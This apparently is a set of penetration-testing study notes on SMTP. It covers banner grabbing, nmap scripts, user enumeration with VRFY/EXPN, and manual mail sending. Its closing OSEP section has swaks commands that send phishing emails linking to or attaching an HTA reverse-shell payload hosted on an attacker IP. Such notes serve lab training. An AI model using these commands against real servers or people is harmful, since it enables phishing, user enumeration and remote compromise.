# (25) SMTP

<details>

<summary>Intro</summary>

* Used to send, receive, and relay outgoing emails
* Main attacks are user enumeration and using an open relay to send spam

</details>

<details>

<summary>Banner Grabbing</summary>

```bash
telnet 10.3.3.47 25
```

* Need to wait for a while

</details>

<details>

<summary>Nmap</summary>

```
nmap 192.168.1.101 --script=smtp* -p 25
```

<pre><code><strong>nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
</strong></code></pre>

</details>

<details>

<summary>User Enumeration</summary>

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
```

* Use `/usr/share/seclists/Usernames/Names/names.txt` wordlist

#### For multiple servers

```bash
for server in $(cat smtpmachines); do echo "******************" $server "*****************"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done
```

</details>

<details>

<summary>Manual Enumeration</summary>

#### Command to check if a user exists

```
VRFY root
```

#### Command to ask the server if a user belongs to a mailing list

```
EXPN root
```

</details>

<details>

<summary>Sending Email using NC</summary>

#### Identify yourself to the mail server

```
HELO example.com
```

#### Specify a return address for the message (if message bounces)

```
MAIL FROM:bar@example.org
```

#### Specify at least one recipient for the message

```
RCPT TO:foo@example.com
```

#### Send the message data

```
DATA
From: bar@example.org
To: foo@example.com
Subject: Test
Date: Thu, 20 Dec 2012 12:00:00 +0000

Testing
.
```

</details>

## OSEP Notes Below

<details>

<summary>Send Email via Swaks</summary>

```bash
# Send phishing link
swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link. http://192.168.45.170/rev.hta" --header "Subject: Issues"  --from bob@example.com

# Send attachment
swaks --to will@example.com --server 192.168.131.159 --body "Hello, check out my link." --header "Subject: Issues"  --from bob@example.com --add-header "MIME-Version: 1.0" --attach @rev.hta
```

</details>

